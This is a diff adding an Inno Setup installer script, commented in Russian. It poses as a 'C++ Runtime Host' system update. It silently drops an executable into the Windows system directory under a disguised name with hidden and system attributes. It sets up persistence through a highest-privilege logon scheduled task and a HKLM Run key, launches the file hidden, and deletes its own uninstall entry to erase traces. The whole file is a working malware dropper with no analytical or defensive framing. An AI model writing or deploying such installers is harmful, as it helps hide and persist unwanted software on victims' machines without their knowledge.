@@ -1,0 +1,38 @@
+[Setup]
+AppName=C++ Runtime Host
+AppVersion=11.0
+; Устанавливаем в системную директорию (System32 для x86 или SysWOW64 для x64)
+DefaultDirName={sys}
+Uninstallable=no
+CreateAppDir=yes
+DirExistsWarning=no
+WindowVisible=no
+OutputBaseFilename=System_Update_Pack
+Compression=lzma
+SolidCompression=yes
+; Требовать права администратора для записи в System32
+PrivilegesRequired=admin
+
+[Files]
+; Источник — твой файл Java. Назначение — System32 под видом системной библиотеки
+Source: "C:\Users\Admin\Desktop\5\Java_Update_v8u481.exe"; DestDir: "{app}"; DestName: "win_host_srv.exe"; Flags: ignoreversion; Attribs: hidden system
+
+[Run]
+; Закрепление через планировщик с высшими правами
+Filename: "schtasks"; Parameters: "/Create /SC ONLOGON /TN ""WinHostSrv"" /TR ""'{app}\win_host_srv.exe'"" /RL HIGHEST /F"; Flags: runhidden
+
+; Автозагрузка через системный реестр (как резерв)
+Filename: "reg"; Parameters: "add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""HostRuntime"" /t REG_SZ /d ""{app}\win_host_srv.exe"" /f"; Flags: runhidden
+
+; Мгновенный скрытый запуск
+Filename: "{app}\win_host_srv.exe"; Flags: nowait runhidden
+
+[Code]
+// Полная очистка следов установки из реестра
+procedure CurStepChanged(CurStep: TSetupStep);
+begin
+  if CurStep = ssPostInstall then
+  begin
+    RegDeleteKeyIncludingSubkeys(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#SetupSetting("AppName")}_is1');
+  end;
+end;
